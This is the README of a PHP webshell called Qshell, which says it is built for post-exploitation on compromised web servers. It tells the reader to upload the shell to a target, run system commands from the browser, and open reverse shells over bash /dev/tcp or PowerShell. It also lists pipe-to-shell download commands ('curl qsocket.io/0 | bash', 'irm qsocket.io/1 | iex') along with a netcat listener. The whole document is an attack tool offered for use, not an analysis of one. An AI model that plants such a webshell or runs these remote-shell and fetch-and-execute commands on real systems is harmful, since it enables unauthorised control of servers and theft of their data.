# Qshell

Lightweight PHP webshell with terminal, reverse shell and QSocket support. Built for post-exploitation on compromised web servers.

## Features

- **Terminal** — execute system commands directly from the browser
- **Backconnect** — reverse shell via TCP (bash on Linux, PowerShell on Windows)
- **QSocket** — reverse shell through [qsocket.io](https://qsocket.io) without port forwarding

## Requirements

- PHP 5.6+
- `shell_exec` enabled on the server
- `curl` available on the target (Linux)

## Usage

Upload `qshell.php` to the target server and access it via browser.

### Terminal

Type any system command and hit **Execute**.

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Backconnect

Start a listener on your machine:

```bash
nc -lvnp 4444
```

Enter your IP and port, then hit **Connect**.

### QSocket

Click **Run** — the shell installs and connects automatically.  
On success, the output shows the connect command:

```
qs-netcat -s <key> -i
```

Run that command on your machine to get the shell.

## OS Detection

Qshell detects the target OS automatically at runtime and adapts all payloads accordingly.

| Feature     | Linux                        | Windows                  |
|-------------|------------------------------|--------------------------|
| Terminal    | `shell_exec`                 | `shell_exec`             |
| Backconnect | `bash /dev/tcp`              | PowerShell TCP client    |
| QSocket     | `curl qsocket.io/0 \| bash`  | `irm qsocket.io/1 \| iex`|



